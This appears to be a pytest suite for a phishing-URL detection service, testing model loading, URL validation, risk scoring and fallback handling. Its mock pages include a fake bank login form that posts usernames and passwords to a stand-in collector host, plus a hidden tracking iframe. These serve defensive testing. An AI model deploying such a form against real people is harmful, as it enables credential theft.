"""Unit and integration tests for Stage 8 Detection Engine service."""

from unittest.mock import MagicMock, patch

import pytest
import requests

from app.core.model_loader import ModelLoader, get_feature_columns, get_model, get_model_metadata
from app.services.detection_engine import DetectionEngine, DetectionResult
from app.services.risk_scoring import (
    HIGH_RISK_THRESHOLD,
    LOW_RISK_THRESHOLD,
    calculate_risk_level,
    generate_detected_indicators,
    has_strong_url_threat_signals,
    map_status_and_risk,
)


@pytest.fixture
def engine():
    """Create a DetectionEngine instance with default settings."""
    return DetectionEngine(fetch_timeout=2.0)


def test_model_loader_singleton_behavior():
    """1. Verify ModelLoader loads model artifacts once and caches them in memory."""
    ModelLoader.reset()
    loader = ModelLoader.get_instance()

    # Initial load count is 0
    assert loader.load_count == 0

    # First access loads artifacts
    model1 = get_model()
    cols1 = get_feature_columns()
    meta1 = get_model_metadata()

    assert loader.load_count == 1
    assert model1 is not None
    assert len(cols1) == 43
    assert meta1.get("algorithm") == "XGBClassifier" or meta1.get("model_type") == "xgboost"

    # Repeated calls should reuse cached artifacts without re-loading
    model2 = get_model()
    cols2 = get_feature_columns()
    assert model1 is model2
    assert cols1 == cols2
    assert loader.load_count == 1


def test_validate_url_scenarios(engine):
    """2. Verify input URL validation across clean, missing-scheme, and invalid inputs."""
    # Valid URLs
    ok, norm, err = engine.validate_url("https://example.com/login")
    assert ok is True
    assert norm == "https://example.com/login"
    assert err is None

    # Missing scheme coerced
    ok, norm, err = engine.validate_url("google.com/search?q=test")
    assert ok is True
    assert norm == "http://google.com/search?q=test"
    assert err is None

    # Invalid empty / None
    ok, _, err = engine.validate_url("")
    assert ok is False
    assert "empty" in err.lower()

    ok, _, err = engine.validate_url(None)
    assert ok is False

    # Unsupported schemes
    ok, _, err = engine.validate_url("javascript:alert('phish')")
    assert ok is False
    assert "unsupported" in err.lower()

    ok, _, err = engine.validate_url("data:text/html,<html></html>")
    assert ok is False

    # Control chars / unparseable
    ok, _, err = engine.validate_url("http://example\x00site.com")
    assert ok is False


def test_analyze_url_safe_legitimate_mocked(engine):
    """3. Verify benign/safe URL with mocked clean HTML yields 'safe' status and low risk."""
    mock_html = """
    <!DOCTYPE html>
    <html lang="en">
      <head>
        <title>Python Documentation - Standard Library Reference</title>
        <link rel="icon" href="/favicon.ico" type="image/x-icon"/>
      </head>
      <body>
        <header>
          <nav>
            <a href="/index.html">Home</a>
            <a href="/tutorial.html">Tutorial</a>
            <a href="/library/index.html">Library</a>
            <a href="/reference/index.html">Reference</a>
            <a href="/whatsnew/index.html">What's New</a>
          </nav>
        </header>
        <main>
          <h1>urllib.parse — Parse URLs into components</h1>
          <p>This module defines a standard interface to break Uniform Resource Locator strings up in components.</p>
          <img src="/static/py.png" alt="Python Logo"/>
          <section>
            <h2>Functions and Classes</h2>
            <ul>
              <li><a href="/library/urllib.parse.html#urlparse">urlparse</a></li>
              <li><a href="/library/urllib.parse.html#urlsplit">urlsplit</a></li>
              <li><a href="/library/urllib.parse.html#urljoin">urljoin</a></li>
              <li><a href="/library/urllib.parse.html#quote">quote</a></li>
              <li><a href="/library/urllib.parse.html#unquote">unquote</a></li>
            </ul>
          </section>
        </main>
        <footer>
          <p>© Python Software Foundation. <a href="/about/legal.html">Legal Notices</a></p>
          <a href="/contact.html">Contact Us</a>
          <a href="/sitemap.html">Site Map</a>
        </footer>
      </body>
    </html>
    """
    mock_response = MagicMock()
    mock_response.status_code = 200
    mock_response.headers = {"Content-Type": "text/html; charset=utf-8"}
    mock_response.encoding = "utf-8"
    mock_response.iter_content.return_value = [mock_html.encode("utf-8")]

    with patch.object(engine.session, "get", return_value=mock_response):
        result = engine.analyze_url("https://example.org/docs")

        assert isinstance(result, DetectionResult)
        assert result.status == "safe"
        assert result.risk_level == "low"
        assert result.is_phishing is False
        assert result.confidence < LOW_RISK_THRESHOLD
        assert result.html_available is True
        assert result.error_message is None
        assert len(result.detected_indicators) > 0


def test_analyze_url_phishing_mocked(engine):
    """4. Verify phishing-style URL with mocked login HTML yields 'phishing' status and high risk."""
    mock_phish_html = """
    <!DOCTYPE html>
    <html>
      <head><title>Verify Your Bank Account</title></head>
      <body>
        <form action="http://malicious-collector.top/steal.php" method="POST">
          <input type="text" name="username" placeholder="Enter Banking User ID"/>
          <input type="password" name="password" placeholder="Password"/>
          <input type="hidden" name="token" value="xyz"/>
          <button type="submit">Verify Now</button>
        </form>
        <iframe src="http://hidden-track.biz" width="0" height="0" hidden></iframe>
      </body>
    </html>
    """
    mock_response = MagicMock()
    mock_response.status_code = 200
    mock_response.headers = {"Content-Type": "text/html; charset=utf-8"}
    mock_response.encoding = "utf-8"
    mock_response.iter_content.return_value = [mock_phish_html.encode("utf-8")]

    phish_url = "http://192.168.1.50/secure-login/account-verification"
    with patch("app.services.detection_engine.is_safe_ssrf_destination", return_value=(True, None)), \
         patch.object(engine.session, "get", return_value=mock_response):
        result = engine.analyze_url(phish_url)

        assert isinstance(result, DetectionResult)
        assert result.status in ("phishing", "suspicious")
        assert result.confidence >= LOW_RISK_THRESHOLD
        assert result.html_available is True
        assert result.error_message is None

        # Verify indicator strings reflect active features
        indicators_text = " ".join(result.detected_indicators).lower()
        assert "ip address" in indicators_text
        assert "login" in indicators_text or "password" in indicators_text or "form" in indicators_text


def test_analyze_url_fetch_timeout_degraded_mode(engine):
    """5. Verify graceful degraded mode on request timeout (URL-only inference)."""
    with patch.object(engine.session, "get", side_effect=requests.exceptions.Timeout("Read timed out")):
        result = engine.analyze_url("https://slow-unreachable-site.com/subpath")

        assert isinstance(result, DetectionResult)
        assert result.status != "error"  # Degraded mode is a valid prediction, not an error
        assert result.html_available is False
        assert 0.0 <= result.confidence <= 1.0
        assert result.risk_level in ("low", "medium", "high")
        assert result.error_message is None

        # Verify degraded indicator is noted
        indicators_text = " ".join(result.detected_indicators).lower()
        assert "could not be inspected" in indicators_text or "url-only" in indicators_text


def test_analyze_url_clean_url_degraded_mode_capped_at_medium(engine):
    """5a. Verify clean unreachable URL is dampened and capped at medium/suspicious, never high/phishing."""
    with patch.object(engine.session, "get", side_effect=requests.exceptions.Timeout("Read timed out")):
        res1 = engine.analyze_url("https://docs.python.org/3/library/os.html")
        assert res1.status in ("safe", "suspicious")
        assert res1.risk_level in ("low", "medium")
        assert res1.confidence <= 0.48
        assert res1.html_available is False

        res2 = engine.analyze_url("https://en.wikipedia.org/wiki/Computer_security")
        assert res2.status in ("safe", "suspicious")
        assert res2.risk_level in ("low", "medium")
        assert res2.confidence <= 0.48


def test_analyze_url_blatant_phishing_url_degraded_mode_stays_high(engine):
    """5b. Verify blatant phishing URL stays high/phishing even when HTML is unreachable."""
    with patch.object(engine.session, "get", side_effect=requests.exceptions.Timeout("Read timed out")):
        # Raw IP + login.php
        res_ip = engine.analyze_url("http://192.168.1.1/login.php")
        assert res_ip.status == "phishing"
        assert res_ip.risk_level == "high"
        assert res_ip.confidence >= 0.70
        assert res_ip.html_available is False
        assert any("url" in ind.lower() for ind in res_ip.detected_indicators)

        # Suspicious TLD + verify keywords
        res_tld = engine.analyze_url("http://free-crypto-login.top/account/verify")
        assert res_tld.status == "phishing"
        assert res_tld.risk_level == "high"
        assert res_tld.confidence >= 0.70


def test_analyze_url_connection_error_degraded_mode(engine):
    """6. Verify graceful degraded mode on DNS / connection failure."""
    with patch.object(engine.session, "get", side_effect=requests.exceptions.ConnectionError("Failed to resolve host")):
        result = engine.analyze_url("http://non-existent-domain-xyz-404.com/path")

        assert isinstance(result, DetectionResult)
        assert result.status != "error"
        assert result.html_available is False
        assert 0.0 <= result.confidence <= 1.0
        assert result.error_message is None


def test_analyze_url_ssl_error_handling(engine):
    """7. Verify SSL certificate errors are handled gracefully and noted in indicators."""
    with patch.object(engine.session, "get", side_effect=requests.exceptions.SSLError("Self-signed certificate")):
        result = engine.analyze_url("https://expired-ssl-site.com")

        assert isinstance(result, DetectionResult)
        assert result.status != "error"
        assert result.html_available is False
        assert any("ssl" in ind.lower() or "certificate" in ind.lower() for ind in result.detected_indicators)


def test_analyze_url_invalid_input_error_handling(engine):
    """8. Verify invalid inputs return status='error' with clear messages and never crash."""
    # Empty string
    res1 = engine.analyze_url("")
    assert res1.status == "error"
    assert res1.risk_level == "unknown"
    assert res1.confidence == 0.0
    assert res1.error_message is not None

    # None
    res2 = engine.analyze_url(None)
    assert res2.status == "error"
    assert res2.error_message is not None

    # Unsupported javascript scheme
    res3 = engine.analyze_url("javascript:void(0)")
    assert res3.status == "error"
    assert "scheme" in res3.error_message.lower()


def test_risk_scoring_and_indicators_content():
    """9. Verify risk scoring mapping and content-specific indicator generation."""
    # Threshold checks
    assert calculate_risk_level(0.15) == "low"
    assert calculate_risk_level(0.45) == "medium"
    assert calculate_risk_level(0.85) == "high"

    status, risk, prob = map_status_and_risk(0.10, False)
    assert status == "safe"
    assert risk == "low"
    assert prob == 0.10

    status, risk, prob = map_status_and_risk(0.50, False)
    assert status == "suspicious"
    assert risk == "medium"
    assert prob == 0.50

    status, risk, prob = map_status_and_risk(0.90, True)
    assert status == "phishing"
    assert risk == "high"
    assert prob == 0.90

    # Test has_strong_url_threat_signals
    assert has_strong_url_threat_signals({"has_ip_address": True}) is True
    assert has_strong_url_threat_signals({"has_suspicious_tld": True, "has_suspicious_keywords": True}) is True
    assert has_strong_url_threat_signals({"uses_https": False, "has_suspicious_keywords": True}) is True
    assert has_strong_url_threat_signals({"uses_https": True, "domain_length": 15}) is False

    # Specific indicator content verification: Scenario A (Shortened URL + Meta Refresh)
    url_feats_a = {"is_shortened_url": True, "uses_https": False}
    html_feats_a = {"num_meta_refresh_redirects": 2, "parse_error": False}
    inds_a = generate_detected_indicators(url_feats_a, html_feats_a, html_available=True)
    assert any("shortening" in ind.lower() for ind in inds_a)
    assert any("meta refresh" in ind.lower() for ind in inds_a)

    # Specific indicator content verification: Scenario B (Mismatched links + External Forms)
    url_feats_b = {"uses_https": True, "has_suspicious_keywords": True}
    html_feats_b = {
        "num_links_with_mismatched_text": 3,
        "num_forms_with_external_action": 1,
        "parse_error": False,
    }
    inds_b = generate_detected_indicators(url_feats_b, html_feats_b, html_available=True)
    assert any("mismatched" in ind.lower() or "misleading" in ind.lower() for ind in inds_b)
    assert any("external" in ind.lower() for ind in inds_b)
    assert any("keywords" in ind.lower() for ind in inds_b)


def test_detection_result_dict_serialization():
    """10. Verify DetectionResult converts to a clean dictionary matching expected schema."""
    res = DetectionResult(
        url="https://example.com",
        status="safe",
        confidence=0.08,
        risk_level="low",
        is_phishing=False,
        html_available=True,
        detected_indicators=["Encrypted HTTPS connection."],
        url_features_summary={"uses_https": True},
        content_rendering_incomplete=False,
    )

    d = res.to_dict()
    assert isinstance(d, dict)
    assert d["url"] == "https://example.com"
    assert d["status"] == "safe"
    assert d["confidence"] == 0.08
    assert d["risk_level"] == "low"
    assert d["is_phishing"] is False
    assert d["html_available"] is True
    assert d["content_rendering_incomplete"] is False
    assert isinstance(d["detected_indicators"], list)
    assert isinstance(d["url_features_summary"], dict)
    assert "analysis_timestamp" in d


def test_is_likely_unrendered_spa_shell_unit_cases():
    """11. Verify is_likely_unrendered_spa_shell heuristic criteria and boundaries."""
    from ml.feature_extraction.html_features import is_likely_unrendered_spa_shell

    # True SPA Shell: 0 links, 0 forms, 0 images, 2 scripts, low text ratio
    spa_feats = {
        "num_links": 0,
        "num_forms": 0,
        "num_images": 0,
        "num_scripts": 2,
        "text_to_html_ratio": 0.03,
        "parse_error": False,
    }
    assert is_likely_unrendered_spa_shell(spa_feats) is True

    # False: No scripts present (genuinely sparse static page)
    no_scripts = dict(spa_feats, num_scripts=0)
    assert is_likely_unrendered_spa_shell(no_scripts) is False

    # False: Static form present (lure/login form)
    with_form = dict(spa_feats, num_forms=1)
    assert is_likely_unrendered_spa_shell(with_form) is False

    # False: Excessive static links present (beyond header shell)
    with_excessive_links = dict(spa_feats, num_links=25)
    assert is_likely_unrendered_spa_shell(with_excessive_links) is False

    # False: Excessive static images present
    with_excessive_images = dict(spa_feats, num_images=5)
    assert is_likely_unrendered_spa_shell(with_excessive_images) is False

    # False: Login form present (adversarial phishing login trap)
    with_login_form = dict(spa_feats, has_login_form=True)
    assert is_likely_unrendered_spa_shell(with_login_form) is False

    # False: High text-to-HTML ratio
    high_text = dict(spa_feats, text_to_html_ratio=0.15)
    assert is_likely_unrendered_spa_shell(high_text) is False

    # False: Parse error
    with_error = dict(spa_feats, parse_error=True)
    assert is_likely_unrendered_spa_shell(with_error) is False



def test_analyze_url_spa_shell_on_clean_url_dampened_at_medium(engine):
    """12. Verify mocked SPA shell response on a clean URL is dampened and capped at medium/suspicious."""
    mock_spa_html = """
    <!doctype html>
    <html lang="en">
      <head>
        <meta charset="utf-8"/>
        <title>Student Portal</title>
        <script defer="defer" src="/static/js/main.js"></script>
        <link href="/static/css/main.css" rel="stylesheet"/>
      </head>
      <body>
        <div id="root"></div>
      </body>
    </html>
    """
    mock_resp = MagicMock()
    mock_resp.status_code = 200
    mock_resp.headers = {"Content-Type": "text/html; charset=utf-8"}
    mock_resp.encoding = "utf-8"
    mock_resp.iter_content.return_value = [mock_spa_html.encode("utf-8")]

    with patch.object(engine.session, "get", return_value=mock_resp):
        res = engine.analyze_url("https://portal.university.edu/dashboard")

        assert isinstance(res, DetectionResult)
        assert res.html_available is True
        assert res.content_rendering_incomplete is True
        assert res.status in ("safe", "suspicious")
        assert res.risk_level in ("low", "medium")
        assert res.confidence <= 0.48
        assert any("javascript-rendered" in ind.lower() or "bounded" in ind.lower() for ind in res.detected_indicators)


def test_analyze_url_spa_shell_on_blatant_phishing_url_escalates_to_high(engine):
    """13. Verify SPA shell on strong phishing URL maintains full threat escalation to high/phishing."""
    mock_spa_html = """
    <!doctype html>
    <html>
      <head><script src="/redirect.js"></script></head>
      <body><div id="app"></div></body>
    </html>
    """
    mock_resp = MagicMock()
    mock_resp.status_code = 200
    mock_resp.headers = {"Content-Type": "text/html"}
    mock_resp.encoding = "utf-8"
    mock_resp.iter_content.return_value = [mock_spa_html.encode("utf-8")]

    with patch("app.services.detection_engine.is_safe_ssrf_destination", return_value=(True, None)), \
         patch.object(engine.session, "get", return_value=mock_resp):
        res = engine.analyze_url("http://192.168.1.100/paypal/login.php")

        assert isinstance(res, DetectionResult)
        assert res.html_available is True
        assert res.content_rendering_incomplete is True
        assert res.status == "phishing"
        assert res.risk_level == "high"
        assert res.confidence >= 0.70
        assert any("threat" in ind.lower() or "javascript-rendered" in ind.lower() for ind in res.detected_indicators)


def test_analyze_url_sparse_static_phishing_without_scripts_not_dampened(engine):
    """14. Verify genuinely sparse static HTML (NO scripts) does not match SPA shell pattern."""
    from ml.feature_extraction.html_features import extract_html_features, is_likely_unrendered_spa_shell

    mock_sparse_html = """
    <!DOCTYPE html>
    <html>
      <head><title>Account Suspended</title></head>
      <body>
        <p>Your account is temporarily suspended. Please contact customer care.</p>
      </body>
    </html>
    """
    extracted = extract_html_features(mock_sparse_html, "http://phish-notice.com")
    assert extracted["num_scripts"] == 0
    assert is_likely_unrendered_spa_shell(extracted) is False

